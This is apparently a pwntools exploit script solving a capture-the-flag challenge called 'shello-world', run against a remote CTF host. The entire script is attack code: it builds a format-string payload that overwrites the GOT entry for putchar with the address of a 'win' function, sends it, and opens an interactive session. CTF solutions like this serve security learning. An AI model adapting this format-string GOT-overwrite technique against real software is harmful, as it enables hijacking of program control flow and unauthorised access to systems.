from pwn import *

elf = context.binary = ELF('./shello-world')
context.log_level = 'info'

#p = process()
p = remote("challs.tfcctf.com",32419)

def got_ow():
    payload = {
                elf.got.putchar: elf.sym.win
            }
    payload = fmtstr_payload(6,payload,write_size='short')
    return payload 

payload = got_ow() 
#p.recvuntil("me? : ")
p.sendline(payload)
p.interactive() 


